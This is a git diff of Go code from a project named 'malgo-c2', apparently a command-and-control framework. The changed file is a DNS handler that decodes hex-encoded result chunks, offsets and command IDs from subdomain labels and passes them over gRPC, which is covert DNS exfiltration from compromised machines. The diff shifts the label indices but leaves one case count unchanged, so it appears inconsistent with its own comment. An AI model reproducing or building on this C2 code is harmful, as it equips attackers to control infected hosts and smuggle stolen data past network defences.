@@ -4,17 +4,18 @@ import (
 	"context"
 	"encoding/hex"
 	"fmt"
-	gateway "github.com/VipWW/malgo-c2/services/common/service"
-	"github.com/miekg/dns"
 	"net"
 	"strconv"
 	"strings"
+
+	gateway "github.com/VipWW/malgo-c2/services/common/service"
+	"github.com/miekg/dns"
 )
 
 // handleA handles result retrieval queries. Queries look like:
 // Either:
-// - <result length>.<CommandID>.<domain>
-// - <data chunk>.<offset>.<CommandID>.<domain>
+// - <char>.<result length>.<CommandID>.<domain>
+// - <char>.<data chunk>.<offset>.<CommandID>.<domain>
 //
 // length and offset are in HEX. Chunk is in HEX. TODO: change to Base58
 func (h *Handler) handleA(msg *dns.Msg, r *dns.Msg) error {
@@ -26,14 +27,14 @@ func (h *Handler) handleA(msg *dns.Msg, r *dns.Msg) error {
 	splitData := strings.Split(dataFromMessage, ".")
 
 	switch len(splitData) {
-	case 2:
+	case 3:
 		// <result length>.<CommandID>.<domain>
-		length, err := strconv.Atoi(splitData[0])
+		length, err := strconv.Atoi(splitData[1])
 		if err != nil {
 			return err
 		}
 		_, err = h.grpcClient.ResultInfo(context.Background(), &gateway.ResultInfoRequest{
-			CommandId: splitData[1],
+			CommandId: splitData[2],
 			Length:    int64(length),
 		})
 		if err != nil {
@@ -41,16 +42,16 @@ func (h *Handler) handleA(msg *dns.Msg, r *dns.Msg) error {
 		}
 	case 4:
 		// <data chunk>.<offset>.<CommandID>.<domain>
-		data, err := hex.DecodeString(splitData[0])
+		data, err := hex.DecodeString(splitData[1])
 		if err != nil {
 			return err
 		}
-		offset, err := strconv.ParseInt(splitData[1], 16, 64)
+		offset, err := strconv.ParseInt(splitData[2], 16, 64)
 		if err != nil {
 			return err
 		}
 		_, err = h.grpcClient.ResultDetailsChunk(context.Background(), &gateway.ResultDetailsChunkRequest{
-			CommandId: splitData[2],
+			CommandId: splitData[3],
 			Offset:    offset,
 			Data:      data,
 		})
